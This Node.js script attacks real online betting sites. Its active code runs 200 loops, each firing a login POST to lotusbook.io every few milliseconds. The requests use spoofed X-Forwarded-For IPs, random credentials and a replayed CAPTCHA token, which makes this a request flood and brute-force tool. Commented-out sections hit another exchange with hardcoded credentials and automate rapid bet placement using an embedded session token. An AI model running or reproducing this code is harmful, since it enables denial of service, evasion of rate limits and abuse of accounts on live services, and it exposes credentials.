const { default: axios } = require("axios");
const uid = require("harsh-uid");

const ip = () => {
  const segment1 = Math.floor(Math.random() * 256);
  const segment2 = Math.floor(Math.random() * 256);
  const segment3 = Math.floor(Math.random() * 256);
  const segment4 = Math.floor(Math.random() * 256);

  return `${segment1}.${segment2}.${segment3}.${segment4}`;
};

let time = 0;
let req = 0;

const checkSpeed = () => {
  time++;
  const curSpeed = `${Math.round(req / time)} req per second`;
  console.log("Cuurent speed: " + curSpeed);
  setTimeout(checkSpeed, 1000);
};

setTimeout(checkSpeed, 1000);

// let resp = 0;

// const hitApi = async () => {
//   try {
//     const curIp = ip();
//     // console.log("IP is", curIp);
//     const domain = "https://www.sairamexchange.com/";

//     const headers = {
//       "X-Forwarded-For": curIp,
//       Origin: domain,
//       Referer: domain,
//       "Content-Type": "application/json",
//     };

//     const data = {
//       userName: "exchange",
//       password: "Abcd1234",
//     };

//     const config = {
//       method: "post",
//       maxBodyLength: Infinity,
//       url: "https://www.sairamexchange.com/app/users/userLogin",
//       headers,
//       data,
//     };

//     axios
//       .request(config)
//       .then(({ data }) => {
//         // console.log("Data:", data.data);
//         // console.log("success");
//         console.log(new Date());
//       })
//       .catch((err) => {
//         // console.log(err);
//         // console.log("fail");
//       });
//     req++;
//   } catch (err) {
//     // console.log("🚀 ~ file: index.js:24 ~ hitApi ~ err:", err.response.data);
//   }
// };

// for (let index = 0; index < 2; index++) {
//   hitApi();
// }

const hitApi2 = async () => {
  try {
    const curIp = ip();
    // console.log("IP is", curIp);
    const domain = "https://lotusbook.io/";

    const headers = {
      "X-Forwarded-For": curIp,
      Origin: domain,
      Referer: domain,
      "Content-Type": "application/json",
    };

    const data = {
      username: uid(10),
      password: uid(10),
      recaptchaResponse:
        "03AFcWeA7QJHjK-3nV-snPEY-1KKCu1PXNqg-N9AcgjrXzg71a4iTDoNJe5XSX9ZO1S26YyXEMC7X7iiURQQm5Er-KfnLHxqfX19wIza5-_ROuEA1r3lh_xR_YXYsw34eGSweVObV_zAhjF4D-CjNFs007DkaLcpDHkaw01iv2TPZAxCtFyMxslMRc5gNcKNJhkjJA7p_NJhxNjRV-H7s7aj7JvSF2t_o6UAJBl_vxbbqfLJzxgRthVkK7BCPkz8exRVRnWmDpHDh6xXjBbA8X2iBAugS8uv-ywFdll17wn4UWiQam6C2HmcIgVel_YuEROq7rek5QoeHYzIn3cBwHhy7fsbGNxcV39ypvF0WIoFeh6JN6bv4zOVqlLph-rZ9HurrG90tnRK95B3RPlpJbE_Asm7yh6ieMVnZArMKzRCTNmWzHcQ4eOMj2NX5ej9b1aMrXsh8P2ioDteji1WHQlC3Ls0gHwJoK45RU7XRcT4awt_q96DE2iejKw4dSQdFh4Up73i86orEhtf1ec9EzO2jhB48aDjQsvuaeQh4KOq1bXpF7Yy4XsFEsIf_qfWy5hYZ_eDzRFociYWRR6X2Xx3Hu3Sqtp915NzR3JHA2zbNZEt_LNVHa_K9rMomtD4Z7wxRapckN025OD4knhdtdx3YtzhBYb-dRtVRaANDMQXaIHqcCXU7kjcEX_UlAigYMKGyZbxZodLVUsyir9ONiXyPEqx87sIgMCqYKveI1WU6yOzOhrj7tHB_PJhdFYX9k90JLU0fIA5mSV0JDT26f-YEe31Uu8KTihjQRozBZ5z3nO5AJ-BnAV1UuyLuUKhTQCLzarcOlCcKrk2koGemsg5S2pgJLVW64dZoISnCS-omRfrngRsLdrohr5LcyCqzmsXoAZEO7TjtTXFTf_llv977Y2q5Y-6uUy10JRCxGtemnSg-QzcEz05cUkzVkqvy5mF38fO0WzyMUbtsyZkCy9lWdo4-1JOaBf9PMch5TAmfOBzdLfyEcIryb5WEOrYQiJUAtmKKj1OVav_NYxgFGKd35-FbbAm_Kg_Z8WuLXvduSBBgKvCQ-ShZt1lArET-HdZVvRYPwIP46tpQymU6SvW64IvsQloXOYsrOjuvJEYQg8YBFTmrFXbAD1s_xsBqrF4swlZnXCHNHG7UmMPPSlxFAZ43AGwp3MPtw7KLTUvw0_OBJzih_ks-XOcgbVF82yjyNz73r71UljwzcirP-V0biH6hxmqyJDRze0DYNQP7YLtc8FUVaExCiCuuCpDumnJ0JOhDUt7cG2nsbhXC8K804yuAqsN81nI32VEQd3Q3ZRUJnrcoisILswd0ZazLsJCiAugBymPsUUS8JT_z5B-nBSiOPzQmCswl9s52Y_bhq1AG_wpOAlUjckyIi_-K2XwUVRG5e1Be1FS6gns5Joi5q_i7k3XMmd5v4lUqpoPCj8SXoXvuHinahH680AeiasMbBsigmvlSGLmXaUf45AFkKPispmG3DRQMxTNCzADnWYDJoygQq5XojnCN32Q51Q5-MLAb8zEPwXJLZX5V-2IGKhBeSMmb-IzTXS3_tMxF8ODw8SfJWHRQxcAsO3lWP0WUuoV40rB-ABB4TXOoiEa2393gwEvlwBE1NGizlycmo3fpxq7NyY6lC_s6hG57NC9Xn4eouGv1-tTqMrRvIzaPYApe74VzexNtNkVhco4pulNOUGl_3ict-8nfrLm-9NRbYFt2ZqT2lLv7UF_pFyXwHXPnB42PQvBg850vJ6iDcBT8Ih_AVGT8FngX2kK_KYcgGhMq_w2yw3hY7aQARUhMctsE4xNJUtLSAOBo4CEdHqu7AdJqtgxmb8I3a6FMVAcA45SmHT1u1Y-MKX2ahSO0Dd7vAmKPzRF3SaC6YaEprSOYZGlJ2wm0",
      answer: "",
      token: "",
    };

    const config = {
      method: "post",
      maxBodyLength: Infinity,
      url: "https://lotusbook.io/api/auth/login",
      headers,
      data,
    };

    axios
      .request(config)
      .then(({ data }) => {
        // console.log("Data:", data.data);
        // console.log("success");
      })
      .catch((err) => {
        // console.log(err.response.data);
        // console.log("fail", new Date().toString());
      });
    req++;
  } catch (err) {
    // console.log("🚀 ~ file: index.js:24 ~ hitApi ~ err:", err.response.data);
  }
};

for (let index = 0; index < 200; index++) {
  setInterval(hitApi2, 5);
}

// hitApi2();

// const token =
//   "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZW1iZXJDb2RlIjoiTEczVDBSMFNNMU4iLCJ0b2tlbklkIjoiZGFkMWIzMDYxN2IxZTE1MzhhNmNlN2E5NzljOTczNGY1ZGY3ODcyOGUyYzJkMWZmOTc1NGU3MmZjYjljMzVlYSIsImxvZ2luQ291bnRyeSI6IklOIiwic2Vzc2lvbklkIjoiNjk4NmMwNTI1NTNkNGNlMGNlOTFhNDZhNWU2YjhkMDcxODUzNzAzMDg3ZWUyZmI3YTcxNjQzMmIxMWMxMDc5NyIsImFsbG93U2hha3RpUHJvIjpmYWxzZSwibGFzdExvZ2luVGltZSI6MTcyNDczMjgwNzAwMCwibmJmIjoxNzI2MDU0OTA4LCJsb2dpbk5hbWUiOiJraDA0NCIsImxvZ2luSVAiOiIxMDMuMTM1LjYyLjAiLCJ0aGVtZSI6ImxvdHVzLWUiLCJleHAiOjE3MjYwOTA5MDgsImlhdCI6MTcyNjA1NDkwOCwibWVtYmVySWQiOjY5OTI3NDUsInVwbGluZXMiOnsiQ09ZIjp7InVzZXJJZCI6MSwidXNlckNvZGUiOiJhZG1pbi51c2VyIn0sIlNNQSI6eyJ1c2VySWQiOjIxMTMzMDAsInVzZXJDb2RlIjoiTEczVCJ9LCJNQSI6eyJ1c2VySWQiOjYzOTIzMzQsInVzZXJDb2RlIjoiTEczVDBSIn0sIkFnZW50Ijp7InVzZXJJZCI6NjQ0MzYyNywidXNlckNvZGUiOiJMRzNUMFIwUyJ9fSwiY3VycmVuY3kiOiJJTlIiLCJpc0RlbW8iOmZhbHNlLCJtYSI6bnVsbCwiYiI6bnVsbCwicyI6bnVsbCwiYyI6bnVsbH0.TXLf2fyjrwo6dOfzVvjsinRbrUz2lqhuKg90FK73bSk";

// const headers = {
//   authorization: token,
//   "content-type": "application/json",
//   accept: "application/json",
//   origin: "https://lotusbook.io",
//   referer: "https://lotusbook.io/",
//   "user-agent":
//     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
//   "x-app-version": "4.0.19.2",
//   "x-client": "mobile",
//   "x-client-id": "451012928.1605029998",
//   "x-client-info": "e883e9a15db99de2fdd0579c576a0693",
//   "x-log-timing": "true",
//   "x-user-id": "LG3T0R0SM0H",
//   "x-xid": "6b76ff17-70d2-b5fe-2373-08f62ee312af",
// };

// const placeBet = async (price) => {
//   try {
//     let data = JSON.stringify([
//       {
//         side: 0,
//         price,
//         selectionId: 12,
//         btype: "ODDS",
//         oddsType: null,
//         eventTypeId: "4",
//         marketId: "1.53089511.340._BR",
//         totalSize: 100,
//         betSlipRef: 0,
//         fromOneClick: 0,
//         betDelay: 5,
//         line: null,
//       },
//     ]);

//     let config = {
//       method: "post",
//       maxBodyLength: Infinity,
//       url: "https://lotusbook.io/api/exchange/order/",
//       headers,
//       data,
//     };

//     const { data: res } = await axios(config);
//     console.log("🚀 ~ file: index.js:157 ~ placeBet ~ res:", res);
//   } catch (err) {
//     console.log(
//       "🚀 ~ file: index.js:129 ~ placeBet ~ err:",
//       err.response.data.error
//     );
//   }
// };

// placeBet();

// const getOdds = async () => {
//   try {
//     let config = {
//       method: "get",
//       maxBodyLength: Infinity,
//       url: "https://lotusbook.io/api/exchange/odds/sma-event/4/53089511",
//       headers,
//     };

//     const { data: res } = await axios(config);
//     const { price } = res.result[0].runners[0].back[0];
//     // console.log("price", price);
//     // const newPrice = (price + 0.009).toFixed(3).toString();
//     // console.log("new price", newPrice);
//     // placeBet(price);
//     for (let index = 0; index < 2; index++) {
//       placeBet(price);
//     }
//   } catch (err) {
//     console.log("��� ~ file: index.js:159 ~ getOdds ~ err:", err);
//   }
// };

// setInterval(getOdds, 1);

// getOdds();
